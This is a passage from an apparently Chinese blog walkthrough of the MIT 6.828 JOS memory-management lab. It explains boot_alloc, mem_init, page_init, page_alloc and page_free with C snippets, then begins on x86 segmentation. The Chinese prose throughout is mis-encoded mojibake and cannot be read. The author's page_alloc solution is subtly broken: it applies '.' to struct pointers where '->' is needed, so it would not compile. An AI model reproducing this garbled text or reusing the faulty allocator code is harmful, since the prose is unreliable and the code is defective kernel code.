kernel&#x27;s bss segment:</span></span><br><span class="line"><span class="comment">// the first virtual address that the linker did *not* assign</span></span><br><span class="line"><span class="comment">// to any kernel code or global variables.</span></span><br><span class="line"><span class="keyword">if</span> (!nextfree) &#123;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> end[];</span><br><span class="line">nextfree = ROUNDUP((<span class="type">char</span> *) end, PGSIZE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a chunk large enough to hold &#x27;n&#x27; bytes, then update</span></span><br><span class="line"><span class="comment">// nextfree.  Make sure nextfree is kept aligned</span></span><br><span class="line"><span class="comment">// to a multiple of PGSIZE.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// LAB 2: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// n == 0, return nextfree directly</span></span><br><span class="line"><span class="keyword">if</span> (!n)</span><br><span class="line"><span class="keyword">return</span> nextfree;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fix up n to PGSIZE</span></span><br><span class="line">n = ROUNDUP(n, PGSIZE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check if OOM, panic</span></span><br><span class="line"><span class="keyword">if</span> (PADDR(nextfree + n) &gt; <span class="number">0x00400000</span>)</span><br><span class="line">panic(<span class="string">&quot;Out of Memory!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// normally return memory</span></span><br><span class="line">result = nextfree;</span><br><span class="line">nextfree += n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="mem-init-ï¼šåˆå§‹åŒ–äºŒçº§é¡µè¡¨ï¼Œå»ºç«‹-freelistï¼ˆpart1ï¼‰"><a href="#mem-init-ï¼šåˆå§‹åŒ–äºŒçº§é¡µè¡¨ï¼Œå»ºç«‹-freelistï¼ˆpart1ï¼‰" class="headerlink" title="mem_init()ï¼šåˆå§‹åŒ–äºŒçº§é¡µè¡¨ï¼Œå»ºç«‹ freelistï¼ˆpart1ï¼‰"></a>mem_init()ï¼šåˆå§‹åŒ–äºŒçº§é¡µè¡¨ï¼Œå»ºç«‹ freelistï¼ˆpart1ï¼‰</h4><p>æŒ‰é¡ºåºæ¥ä¸‹æ¥åˆ° <code>mem_init()</code> å‡½æ•°ï¼Œæƒ¯ä¾‹å…ˆçœ‹æ³¨é‡Šï¼Œä¸»è¦æ˜¯åˆå§‹åŒ–å†…æ ¸åœ°å€ç©ºé—´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Set up a two-level page table:</span></span><br><span class="line"><span class="comment">//    kern_pgdir is its linear (virtual) address of the root</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This function only sets up the kernel part of the address space</span></span><br><span class="line"><span class="comment">// (ie. addresses &gt;= UTOP).  The user part of the address space</span></span><br><span class="line"><span class="comment">// will be set up later.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// From UTOP to ULIM, the user is allowed to read but not write.</span></span><br><span class="line"><span class="comment">// Above ULIM the user cannot read or write.</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯é€šè¿‡ <code>i386_detect_memory()</code> æ£€æµ‹å¯ç”¨å†…å­˜å®¹é‡ï¼Œä¹‹åç”¨ <code>boot_alloc()</code> åˆ†é…ä¸€å¼ é¡µé¢åšäºŒçº§é¡µè¡¨çš„ PGDï¼Œå¹¶<strong>å»ºç«‹è‡ªæˆ‘æ˜ å°„ï¼Œè®¾ç½®å¯¹åº”æƒé™</strong>ï¼Œä»¥æ­¤æˆ‘ä»¬ä¾¿èƒ½é€šè¿‡è™šæ‹Ÿåœ°å€è®¿é—®é¡µè¡¨äº†</p><blockquote><p>å‚è§  <code>memlayout.h</code> ä¸­çš„å†…å­˜å¸ƒå±€ï¼Œ<code>UVPT</code> æŒ‡å‘ PGD èµ·å§‹åœ°å€ï¼Œ<code>PDX()</code> åˆ™æ˜¯å°†è™šæ‹Ÿåœ°å€è½¬æ¢åˆ°é¡µç›®å½•è¡¨é¡¹ä¸‹æ ‡çš„å®ï¼Œ<code>PTE_U</code> è¡¨ç¤º ring0~ring3éƒ½èƒ½è®¿é—®ï¼Œ<code>PTE_P</code> è¡¨ç¤ºè¯¥é¡µé¢å­˜åœ¨</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">mem_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> cr0;</span><br><span class="line"><span class="type">size_t</span> n;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Find out how much memory the machine has (npages &amp; npages_basemem).</span></span><br><span class="line">i386_detect_memory();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove this line when you&#x27;re ready to test this function.</span></span><br><span class="line"><span class="comment">//panic(&quot;mem_init: This function is not finished\n&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// create initial page directory.</span></span><br><span class="line">kern_pgdir = (<span class="type">pde_t</span> *) boot_alloc(PGSIZE);</span><br><span class="line"><span class="built_in">memset</span>(kern_pgdir, <span class="number">0</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Recursively insert PD in itself as a page table, to form</span></span><br><span class="line"><span class="comment">// a virtual page table at virtual address UVPT.</span></span><br><span class="line"><span class="comment">// (For now, you don&#x27;t have understand the greater purpose of the</span></span><br><span class="line"><span class="comment">// following line.)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Permissions: kernel R, user R</span></span><br><span class="line">kern_pgdir[PDX(UVPT)] = PADDR(kern_pgdir) | PTE_U | PTE_P;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆ°ç”±æˆ‘ä»¬è¡¥å…¨çš„éƒ¨åˆ†ï¼šåˆ†é… pages æ•°ç»„å¹¶åˆå§‹åŒ–ä¸º 0ï¼Œåå‡ ç§’å°±èƒ½å†™å®Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Allocate an array of npages &#x27;struct PageInfo&#x27;s and store it in &#x27;pages&#x27;.</span></span><br><span class="line"><span class="comment">// The kernel uses this array to keep track of physical pages: for</span></span><br><span class="line"><span class="comment">// each physical page, there is a corresponding struct PageInfo in this</span></span><br><span class="line"><span class="comment">// array.  &#x27;npages&#x27; is the number of physical pages in memory.  Use memset</span></span><br><span class="line"><span class="comment">// to initialize all fields of each struct PageInfo to 0.</span></span><br><span class="line"><span class="comment">// Your code goes here:</span></span><br><span class="line">pages = (<span class="keyword">struct</span> PageInfo*) boot_alloc(npages * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> PageInfo));</span><br><span class="line"><span class="built_in">memset</span>(pages, <span class="number">0</span>, npages * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> PageInfo));</span><br></pre></td></tr></table></figure><p>ç»§ç»­é˜…è¯»ï¼Œæ¥ä¸‹æ¥ä¼šè°ƒç”¨ <code>page_init()</code> åˆå§‹åŒ– pages æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ª PageInfo ï¼Œä¸»è¦æ˜¯è®¾ç½®å¼•ç”¨è®¡æ•°ä¸º 0 å¹¶é“¾åˆ° freelist ä¸Šï¼Œä¹‹åæ˜¯ä¸‰ä¸ªæ£€æŸ¥å‡½æ•°ï¼ŒExercise 1 ä¸­æåˆ°æˆ‘ä»¬è¿™ä¸€æ­¥åªéœ€è¦è¡¥å…¨åˆ° <code>check_page_free_list()</code>ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥å¼€å§‹è¡¥å…¨ <code>page_init()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Now that we&#x27;ve allocated the initial kernel data structures, we set</span></span><br><span class="line"><span class="comment">// up the list of free physical pages. Once we&#x27;ve done so, all further</span></span><br><span class="line"><span class="comment">// memory management will go through the page_* functions. In</span></span><br><span class="line"><span class="comment">// particular, we can now map memory using boot_map_region</span></span><br><span class="line"><span class="comment">// or page_insert</span></span><br><span class="line">page_init();</span><br><span class="line"></span><br><span class="line">check_page_free_list(<span class="number">1</span>);</span><br><span class="line">check_page_alloc();</span><br><span class="line">check_page();</span><br></pre></td></tr></table></figure><h4 id="page-init-ï¼šåˆå§‹åŒ–-pages-æ•°ç»„ä¸-freelist"><a href="#page-init-ï¼šåˆå§‹åŒ–-pages-æ•°ç»„ä¸-freelist" class="headerlink" title="page_init()ï¼šåˆå§‹åŒ– pages æ•°ç»„ä¸ freelist"></a>page_init()ï¼šåˆå§‹åŒ– pages æ•°ç»„ä¸ freelist</h4><p>æƒ¯ä¾‹å…ˆçœ‹æ³¨é‡Šï¼šåˆå§‹åŒ– pages ç»“æ„ä½“ä¸ freelist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Initialize page structure and memory free list.</span></span><br><span class="line"><span class="comment">// After this is done, NEVER use boot_alloc again.  ONLY use the page</span></span><br><span class="line"><span class="comment">// allocator functions below to allocate and deallocate physical</span></span><br><span class="line"><span class="comment">// memory via the page_free_list.</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æŒ‰æ³¨é‡Šè¿›è¡Œè¡¥å…¨ï¼Œæˆ‘ä»¬éœ€è¦æ˜ç¡®å“ªäº›é¡µåœ¨&#x2F;ä¸åœ¨ç©ºé—²çŠ¶æ€ï¼š</p><ul><li>ç¬¬ä¸€å¼ ç‰©ç†å†…å­˜é¡µä¸ºåœ¨ä½¿ç”¨çŠ¶æ€ï¼Œä¿å­˜ç€å®æ¨¡å¼çš„ IDT ä¸ BIOS ç»“æ„</li><li><code>[PGSIZE, npages_basemem * PGSIZE)</code> ä¸ºå¯ç”¨çš„ç©ºé—²å†…å­˜</li><li><code>[IOPHYSMEM, EXTPHYSMEM)</code> è¿™ä¸€å—å†…å­˜ç”¨ä½œ IOï¼Œå¯¹æˆ‘ä»¬æ¥è¯´æ˜¯ä¸€ä¸ªâ€œå†…å­˜ç©ºæ´â€ï¼Œä¹Ÿä¸åº”å½“è¢«ä½¿ç”¨</li><li><code>[EXTPHYSMEM, ...)</code> è¿™ä¸€å—æ‰©å±•å†…å­˜ï¼Œæœ‰çš„æ˜¯åœ¨ä½¿ç”¨ç€çš„ï¼Œæœ‰çš„åˆæ˜¯ç©ºé—²çš„ï¼Œæˆ‘ä»¬éœ€è¦ç»•å¼€ï¼š<ul><li>å†…æ ¸é•œåƒ</li><li>é¡µè¡¨</li><li>å…¶ä»–æ•°æ®ç»“æ„</li></ul></li></ul><p>æœ€åä¸€ä¸ªä¼¼ä¹æ¯”è¾ƒæ£˜æ‰‹ï¼Œä½†æˆ‘ä»¬çŸ¥é“ boot_alloc() åˆå§‹åŒ– nextfree æ—¶ç”¨åˆ°ä¸€ä¸ªå˜é‡ end æŒ‡å‘å†…æ ¸ bss æ®µæœ«å°¾ï¼Œè¯´æ˜<strong>å¾€åçš„éƒ½æ˜¯å¯ç”¨çš„å†…å­˜</strong>ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦å°†ç¬¬ä¸‰é¡¹å¾€åä¸€ç›´åˆ° nextfree çš„å†…å­˜é¡µè®¾ä¸ºä½¿ç”¨çŠ¶æ€ã€nextfree å¾€åçš„å†…å­˜è®¾ä¸ºç©ºé—²é¡µé“¾å…¥ freelist å³å¯</p><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„ä¸€ä¸ªç‚¹ï¼š<code>boot_alloc()</code> åˆ†é…çš„æ˜¯è™šæ‹Ÿå†…å­˜ï¼Œ<strong>ä½†æ˜¯ pages æ•°ç»„å¯¹åº”çš„æ˜¯ç‰©ç†å†…å­˜</strong>ï¼Œå› æ­¤è¿™é‡Œåˆ«å¿˜äº†è¿›è¡Œè½¬æ¢ï¼ˆç¬”è€…å°±åœ¨è¿™ç¢°äº†å‘ï¼‰</p><p>æ³¨æ„ä»¥ä¸Šè¿™äº›æ ‡å‡†ä¹‹åï¼Œä¿®æ”¹ <code>page_init()</code> çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// The example code here marks all physical pages as free.</span></span><br><span class="line"><span class="comment">// However this is not truly the case.  What memory is free?</span></span><br><span class="line"><span class="comment">//  1) Mark physical page 0 as in use.</span></span><br><span class="line"><span class="comment">//     This way we preserve the real-mode IDT and BIOS structures</span></span><br><span class="line"><span class="comment">//     in case we ever need them.  (Currently we don&#x27;t, but...)</span></span><br><span class="line"><span class="comment">//  2) The rest of base memory, [PGSIZE, npages_basemem * PGSIZE)</span></span><br><span class="line"><span class="comment">//     is free.</span></span><br><span class="line"><span class="comment">//  3) Then comes the IO hole [IOPHYSMEM, EXTPHYSMEM), which must</span></span><br><span class="line"><span class="comment">//     never be allocated.</span></span><br><span class="line"><span class="comment">//  4) Then extended memory [EXTPHYSMEM, ...).</span></span><br><span class="line"><span class="comment">//     Some of it is in use, some is free. Where is the kernel</span></span><br><span class="line"><span class="comment">//     in physical memory?  Which pages are already in use for</span></span><br><span class="line"><span class="comment">//     page tables and other data structures?</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Change the code to reflect this.</span></span><br><span class="line"><span class="comment">// NB: DO NOT actually touch the physical memory corresponding to</span></span><br><span class="line"><span class="comment">// free pages!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0) init</span></span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="type">size_t</span> next_free_addr;</span><br><span class="line">page_free_list = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1) real-mode IDT and BIOS</span></span><br><span class="line">pages[<span class="number">0</span>].pp_ref = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2) [PGSIZE, npages_basemem * PGSIZE), all free</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; npages_basemem; i++) &#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3) [IOPHYSMEM, EXTPHYSMEM), treat it as a hole</span></span><br><span class="line"><span class="keyword">for</span> (i = IOPHYSMEM/PGSIZE; i &lt; EXTPHYSMEM/PGSIZE; i++) &#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4) kernel image, page tables, other structure in user, others free</span></span><br><span class="line">next_free_addr = (<span class="type">size_t</span>) PADDR(boot_alloc(<span class="number">0</span>));</span><br><span class="line"><span class="keyword">for</span> (i = EXTPHYSMEM/PGSIZE; i &lt; next_free_addr / PGSIZE; i++) &#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = next_free_addr / PGSIZE; i &lt; npages; i++) &#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="page-alloc-ï¼šåˆ†é…å•ä¸ªç©ºé—²é¡µé¢"><a href="#page-alloc-ï¼šåˆ†é…å•ä¸ªç©ºé—²é¡µé¢" class="headerlink" title="page_alloc()ï¼šåˆ†é…å•ä¸ªç©ºé—²é¡µé¢"></a>page_alloc()ï¼šåˆ†é…å•ä¸ªç©ºé—²é¡µé¢</h4><p>è¿™ä¸€å—æ¯”è¾ƒç®€å•ï¼Œç›´æ¥ä» freelist ä¸­å–å‡ºä¸€ä¸ªé¡µé¢å³å¯ï¼Œè¿™é‡Œæ³¨æ„å¦‚æœæœ‰ <code>ALLOC_ZERO</code> åˆ™éœ€è¦æˆ‘ä»¬å¸®å¿™æ¸…é›¶ï¼Œ<strong>è€Œä¸”æˆ‘ä»¬åˆ†é…æ—¶ä¸åº”å½“å¢åŠ å¼•ç”¨è®¡æ•°ï¼Œè¿™åº”è¯¥æ˜¯ç”± caller å®Œæˆçš„</strong></p><p>è¿™é‡Œæˆ‘ä»¬åˆ«å¿˜äº†åœ¨æ¸…é›¶æ—¶åº”å½“ç”¨ <code>page2kva</code> å°† PageInfo ç»“æ„ä½“åœ°å€è½¬åŒ–ä¸ºå…¶å¯¹åº”é¡µé¢çš„è™šæ‹Ÿåœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Allocates a physical page.  If (alloc_flags &amp; ALLOC_ZERO), fills the entire</span></span><br><span class="line"><span class="comment">// returned physical page with &#x27;\0&#x27; bytes.  Does NOT increment the reference</span></span><br><span class="line"><span class="comment">// count of the page - the caller must do these if necessary (either explicitly</span></span><br><span class="line"><span class="comment">// or via page_insert).</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Be sure to set the pp_link field of the allocated page to NULL so</span></span><br><span class="line"><span class="comment">// page_free can check for double-free bugs.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns NULL if out of free memory.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: use page2kva and memset</span></span><br><span class="line"><span class="keyword">struct</span> PageInfo *</span><br><span class="line"><span class="title function_">page_alloc</span><span class="params">(<span class="type">int</span> alloc_flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">victim</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// out of memory</span></span><br><span class="line"><span class="keyword">if</span> (!page_free_list)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// normal alloc</span></span><br><span class="line">victim = page_free_list;</span><br><span class="line">page_free_list = page_free_list.pp_link;</span><br><span class="line">victim.pp_link = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_ZERO)</span><br><span class="line"><span class="built_in">memset</span>(page2kva(victim), <span class="number">0</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="page-free-ï¼šé‡Šæ”¾å•ä¸ªé¡µé¢"><a href="#page-free-ï¼šé‡Šæ”¾å•ä¸ªé¡µé¢" class="headerlink" title="page_free()ï¼šé‡Šæ”¾å•ä¸ªé¡µé¢"></a>page_free()ï¼šé‡Šæ”¾å•ä¸ªé¡µé¢</h4><p>ä¸»è¦æ˜¯ä¸€äº›æ£€æŸ¥ä¹‹åæ’å…¥ freelist å¤´éƒ¨å³å¯ï¼Œç¬”è€…è¿˜è‡ªè¡ŒåŠ äº†ä¸€ä¸ªç±»ä¼¼ ptmalloc ä¸­å¯¹å¤´éƒ¨çš„ç®€æ˜“ double free æ£€æµ‹ï¼ˆç¬‘ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Return a page to the free list.</span></span><br><span class="line"><span class="comment">// (This function should only be called when pp-&gt;pp_ref reaches 0.)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_free</span><span class="params">(<span class="keyword">struct</span> PageInfo *pp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="comment">// Hint: You may want to panic if pp-&gt;pp_ref is nonzero or</span></span><br><span class="line"><span class="comment">// pp-&gt;pp_link is not NULL.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// check for double free at top</span></span><br><span class="line"><span class="keyword">if</span> (pp == page_free_list)</span><br><span class="line">panic(<span class="string">&quot;double free detected (freelist top)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check double free by pp_link</span></span><br><span class="line"><span class="keyword">if</span> (pp-&gt;pp_link)</span><br><span class="line">panic(<span class="string">&quot;double free detected (pp_link)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check validation by pp_ref</span></span><br><span class="line"><span class="keyword">if</span> (pp-&gt;pp_ref)</span><br><span class="line">panic(<span class="string">&quot;cannot free a page in use!&quot;</span>);</span><br><span class="line"></span><br><span class="line">pp-&gt;pp_link = page_free_list;</span><br><span class="line">page_free_list = pp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œ Exercise 1 å°±å®Œæˆäº†ï¼Œæ¥ä¸‹æ¥è¿›å…¥ Part2.</p><h2 id="Part-2-Virtual-Memory"><a href="#Part-2-Virtual-Memory" class="headerlink" title="Part 2: Virtual Memory"></a>Part 2: Virtual Memory</h2><p>ä¸€ä¸Šæ¥å°±æ˜¯ Exercise 2ï¼Œä¸»è¦æ˜¯è®©æˆ‘ä»¬äº†è§£ 80386 ä¸‹çš„<strong>åˆ†æ®µ</strong>å’Œ<strong>åˆ†é¡µ</strong></p><blockquote><p><strong>Exercise 2.</strong> Look at chapters 5 and 6 of the <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/toc.htm">Intel 80386 Reference Manual</a>, if you havenâ€™t done so already. Read the sections about page translation and page-based protection closely (5.2 and 6.4). We recommend that you also skim the sections about segmentation; while JOS uses the paging hardware for virtual memory and protection, segment translation and segment-based protection cannot be disabled on the x86, so you will need a basic understanding of it.</p></blockquote><p>åˆ†æ®µå¤§å®¶éƒ½æ‡‚ï¼Œå°±æ˜¯ä¸€ä¸ªæ®µå¯„å­˜å™¨é‡Œå­˜æ”¾æ®µé€‰æ‹©å­å¯¹åº”ä¸€ä¸ªæ®µæè¿°ç¬¦è¡¨ç¤ºä¸€å—è¿ç»­çš„å†…å­˜ç§°ä¸ºä¸€ä¸ªsegmentï¼Œåˆ†é¡µåˆ™æ˜¯ä¾æ‰˜é¡µè¡¨è¿™ä¸€ç»“æ„å»ºç«‹èµ·è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€é—´çš„æ˜ å°„ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯è¯´æ˜åˆ†é¡µå‡ºç°ä»¥ååˆ†æ®µå°±è‡ªç„¶è€Œç„¶åœ°æ¶ˆå¤±äº†å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å¦å®šçš„ï¼Œ<strong>åˆ†é¡µä¸åˆ†æ®µå…¶å®æ˜¯åŒæ—¶å­˜åœ¨çš„</strong>ï¼Œå› ä¸ºè¿™æ˜¯ç”±ç¡¬ä»¶ï¼ˆCPUï¼‰æä¾›çš„åŠŸèƒ½</p><p>ä¸‹å›¾æ˜¯ä¸€å¼ åˆ†é¡µä¸åˆ†æ®µç›¸ç»“åˆçš„é€»è¾‘åœ°å€åˆ°ç‰©ç†åœ°å€é—´è½¬æ¢çš„è¿‡ç¨‹</p><p><img src="https://s2.loli.net/2022/03/15/fYIXuTGWdMn7ViE.png" alt="image.png"></p><p>ç¬”è€…è¿™é‡Œå‚ç…§å…¶æä¾›çš„æ–‡æ¡£ç®€è¿°ä¸€ä¸‹åˆ†æ®µ+åˆ†é¡µä¸‹çš„åœ°å€ç¿»è¯‘</p><h4 id="Segment-Translation"><a href="#Segment-Translation" class="headerlink" title="Segment Translation"></a>Segment Translation</h4><p>è¿›å…¥ä¿æŠ¤æ¨¡å¼ä¹‹åï¼Œæ®µå¯„å­˜å™¨å¹¶æ²¡æœ‰å¼ƒç”¨ï¼Œä»ç„¶æ‰¿æ‹…ç€å…¶â€œæè¿°ä¸€ä¸ªå†…å­˜æ®µâ€çš„ä½œç”¨ï¼Œä½†ä»…æœ‰ 16 ä½çš„ã€æ•°é‡å°‘å¾—å¯æ€œçš„æ®µå¯„å­˜å™¨æ—©å·²æ— æ³•æ»¡è¶³äººä»¬çš„éœ€æ±‚ï¼Œå› æ­¤åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹æ®µå¯„å­˜å™¨ä¸å†ç›´æ¥å­˜æ”¾æ®µçš„åŸºå€ï¼Œè€Œæ˜¯å­˜æ”¾ç€ã€Œæ®µé€‰æ‹©å­ã€ï¼ˆsegment selectorï¼‰â€”â€”çœŸæ­£çš„æ®µæè¿°ç¬¦ï¼ˆsegment descriptorï¼‰å­˜æ”¾åœ¨ä¸€ä¸ªåä¸ºã€Œæ®µæè¿°ç¬¦è¡¨ã€ï¼ˆsegment descriptor tableï¼‰çš„ä¸€å—è¿ç»­å†…å­˜ä¸Šï¼Œæ®µé€‰æ‹©å­ç”¨ä»¥æ ‡è¯†å¯¹åº”çš„æ®µæè¿°ç¬¦åœ¨æ®µæè¿°ç¬¦è¡¨ä¸­çš„ä¸‹æ 